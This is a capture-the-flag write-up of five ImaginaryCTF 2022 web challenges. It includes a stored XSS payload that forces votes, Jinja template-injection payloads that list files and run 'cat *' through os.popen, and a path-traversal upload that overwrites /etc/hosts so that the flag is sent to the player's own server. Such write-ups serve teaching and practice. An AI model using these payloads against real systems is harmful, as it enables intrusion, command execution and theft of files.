# ImaginaryCTF_2022 - Web

Hello, My nickname is Small_Wolf, and I focus on playing Web challenges. I hope that my write-up is useful to you.

## I. Button

### Description

![Untitled](ImaginaryCTF_2022%20-%20Web%20b2b565b4651c4b3484dcf44712ded6cc/Untitled.png)

## Solution

![The front-end of the web page.](ImaginaryCTF_2022%20-%20Web%20b2b565b4651c4b3484dcf44712ded6cc/Untitled%201.png)

The front-end of the web page.

At first, we can’t see any content when opening the front-end of the web page. Let view source code of the page

![Untitled](ImaginaryCTF_2022%20-%20Web%20b2b565b4651c4b3484dcf44712ded6cc/Untitled%202.png)

You can see a lot of button tags here but the button is hidden. let modify some javascript style of properties to see these buttons (See the following image).

![the border is switched over to solid and the color is switched to black](ImaginaryCTF_2022%20-%20Web%20b2b565b4651c4b3484dcf44712ded6cc/Untitled%203.png)

the border is switched over to solid and the color is switched to black

Clicking any button, we can see content that has flag format. However, it is not the real flag

![Untitled](ImaginaryCTF_2022%20-%20Web%20b2b565b4651c4b3484dcf44712ded6cc/Untitled%204.png)

Scroll down the web page and we can see a <script> tag which gives us hint

![Untitled](ImaginaryCTF_2022%20-%20Web%20b2b565b4651c4b3484dcf44712ded6cc/Untitled%205.png)

I see that there is a function called “motSusfunclion” (not “notSusfunclion”), so I guest that there is a button which will execute this function when clicking it and show us the real flag.

![Untitled](ImaginaryCTF_2022%20-%20Web%20b2b565b4651c4b3484dcf44712ded6cc/Untitled%206.png)

Finally, I find the button which execute “motSusfunction” and get the real flag

![Untitled](ImaginaryCTF_2022%20-%20Web%20b2b565b4651c4b3484dcf44712ded6cc/Untitled%207.png)

### Result

flag: ictf{y0u_f0und_7h3_f1ag!}

## II. rooCookie

### Description

![Untitled](ImaginaryCTF_2022%20-%20Web%20b2b565b4651c4b3484dcf44712ded6cc/Untitled%208.png)

### Solution

![font-end of the web page and hint](ImaginaryCTF_2022%20-%20Web%20b2b565b4651c4b3484dcf44712ded6cc/Untitled%209.png)

font-end of the web page and hint

Let’s view the source of the web page

![Untitled](ImaginaryCTF_2022%20-%20Web%20b2b565b4651c4b3484dcf44712ded6cc/Untitled%2010.png)

In the source, we can see a javascript function that encrypts a text and assign that value to “document.cookie” property. We can also see a document.cookie assigned with a static value. It means that the clear cookie is encrypted with the createToken() function and the encrypted cookie is inside the source code. To get the real flag, we need to decrypt the encrypted cookie.

Here is the following python script to decrypt encrypted cookie.

```python
a="1000110"
s= int(a,2)
token="101100000111011000000110101110011101100000001010111110010101101111101011110111010111001110101001011101001100001011000000010101111101101011111011010011000010100101110101001101001010010111010101111110101011011111011000000110110000001101100001011010111110110110000000101011100101010100101110100110000101011101111010111000110110000010101011101001011000100110101110110101001111101010111111010101000001101011011011010100010110101110110101011011111010100010110101101101101100001011010110111110101000011101011111001010100010110101101101101100000101010011111010100111110101011011011010111000010101000010101011100101011000101110100110000"
d=0
flag=""
while(d<len(token)):
    st=token[d:d+11]
    d=d+11
    s= int(st,2)
    flag+=chr(s-1337+43)
print(flag)
```

![We finally get the decrypted cookie containing the flag](ImaginaryCTF_2022%20-%20Web%20b2b565b4651c4b3484dcf44712ded6cc/Untitled%2011.png)

We finally get the decrypted cookie containing the flag

### Result

Flag: ictf{h0p3_7ha7_wa5n7_t00_b4d}

## III. ****Democracy****

### Description

![Untitled](ImaginaryCTF_2022%20-%20Web%20b2b565b4651c4b3484dcf44712ded6cc/Untitled%2012.png)

### Solution

Before giving a free flag for us, this challenge had been an XSS challenge. Generally, the page has login and register function. users will create an account to vote for different users and user who have the most votes will receive the flag.

You need to create a primary account in which you can get the final flag after receiving the most votes and get the **id** of this account. Vote for this account to see the username of this account on the page. Create another account, of which the username is an XSS script that triggers voting action.

Example: <script>fetch('http://chal.imaginaryctf.org:1339/vote/<id of the primary account></script>

### Result

Flag: ictf{i'm_sure_you_0btained_this_flag_with0ut_any_sort_of_trickery...}

## IV. ****SSTI Golf****

### Description

![Untitled](ImaginaryCTF_2022%20-%20Web%20b2b565b4651c4b3484dcf44712ded6cc/Untitled%2013.png)

### Solution

after having access to the link, we can see the source code of the page and this is a ssti challenge

![Untitled](ImaginaryCTF_2022%20-%20Web%20b2b565b4651c4b3484dcf44712ded6cc/Untitled%2014.png)

The source code is quite easy to understand, the length of the parameter “query” need to be less than 49 characters. 

After searching for suitable payloads from this [page](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md). Here is my payload:

- List files:

```python
{{cycler.__init__.__globals__.os.listdir('.')}}
```

![Untitled](ImaginaryCTF_2022%20-%20Web%20b2b565b4651c4b3484dcf44712ded6cc/Untitled%2015.png)

- cat files:

```python
{{url_for.__globals__.os.popen('cat *').read()}}
```

![Untitled](ImaginaryCTF_2022%20-%20Web%20b2b565b4651c4b3484dcf44712ded6cc/Untitled%2016.png)

### Result

Flag: ictf{F!1+3r5s!?}

## V. ****Hostility****

### Description

![Untitled](ImaginaryCTF_2022%20-%20Web%20b2b565b4651c4b3484dcf44712ded6cc/Untitled%2017.png)

### Solution

after having access to the link, we can see the source code of the page

![Untitled](ImaginaryCTF_2022%20-%20Web%20b2b565b4651c4b3484dcf44712ded6cc/Untitled%2018.png)

If you look at this line

```python
file.save("./uploads/"+file.filename)
```

You can see that `file.filename`variable is controlled by the user. By abusing path traversal, we are able to write the file to arbitrary location. In this case we will write into file hosts because after seeing dockerfile, we don’t have right to write into `/app` . We will host HTTP server listening to port 1337

![Untitled](ImaginaryCTF_2022%20-%20Web%20b2b565b4651c4b3484dcf44712ded6cc/Untitled%2019.png)

Creating file host and upload it to the server and capture that packet by using burpsuit

![Untitled](ImaginaryCTF_2022%20-%20Web%20b2b565b4651c4b3484dcf44712ded6cc/Untitled%2020.png)

Change filename variable from ‘host’ to ‘../../etc/hosts’ and send packet

![Untitled](ImaginaryCTF_2022%20-%20Web%20b2b565b4651c4b3484dcf44712ded6cc/Untitled%2021.png)

Go to [https://hostility.chal.imaginaryctf.org/flag](https://hostility.chal.imaginaryctf.org/flag) and the server will send flag to our server

![Untitled](ImaginaryCTF_2022%20-%20Web%20b2b565b4651c4b3484dcf44712ded6cc/Untitled%2022.png)

### Result

Flag: ictf{man_maybe_running_my_webserver_as_root_wasnt_a_great_idea_hmmmm}